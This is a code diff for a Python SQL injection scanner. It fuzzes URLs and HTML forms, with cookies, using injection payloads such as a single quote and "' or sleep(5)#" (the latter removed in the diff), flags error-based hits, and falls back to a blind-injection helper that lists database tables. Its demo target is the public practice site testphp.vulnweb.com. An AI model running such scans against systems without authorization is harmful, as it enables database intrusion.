@@ -3,14 +3,18 @@ import re
 import requests
 from bs4 import BeautifulSoup as bs
 import Blinder
+from forms import *
 
 
 class sql:
-    payloads = ["'", '#', "' or sleep(5)#"]
+    payloads = ["'", '#', "' FOO"]
     value_terminators = ["'", ";SELECT 1", "%00"]
+    #Will used for blind ınjection later on
+    crawled_urls = []
 
-    def __init__(self, url):
+    def __init__(self, url , cookies=None):
         self.url = url
+        self.cookies = cookies
 
     def identify_url(self):
         url_scheme = urlparse(self.url)
@@ -26,6 +30,17 @@ class sql:
                 if not vulnerability:
                     is_blind(self.url)
 
+    def fuzz_Forms(self):
+        form_list = forms(self.url, self.cookies)
+        for form in form_list:
+            for P in sqlscanner.payloads:
+                response = submit(self.url, form_specs=form, cookies=self.cookies, payload=P)
+                if is_vulnerable(response[0], self.url):
+                    print("SQL Injection at {0} with {1} payload with form {2}".format(self.url, P, form))
+                else:
+                    sqlscanner.crawled_urls.append(self.url)
+
+
 
 def is_vulnerable(response, url):
     errors = [
@@ -37,13 +52,11 @@ def is_vulnerable(response, url):
         # Oracle
         "quoted string not properly terminated",
     ]
-
+    decoded_object = response.decode().lower()
     for error in errors:
-        if len(response.body.find_all(text=re.compile(error))) > 0:
+        if decoded_object.find(error) > -1:
             print("SQL Injection at {}".format(url))
             return True
-        else:
-            continue
     return False
 
 
@@ -54,6 +67,7 @@ def is_blind(url):
         print(blindCheck.get_tables())
 
 
+
 if __name__ == '__main__':
-    sqlscanner = sql("http://testphp.vulnweb.com/listproducts.php?cat=1")
-    sqlscanner.fuzz_url(sqlscanner.identify_url())
+    sqlscanner = sql("http://testphp.vulnweb.com/userinfo.php", cookies={"login": "test/test"})
+    sqlscanner.fuzz_Forms()
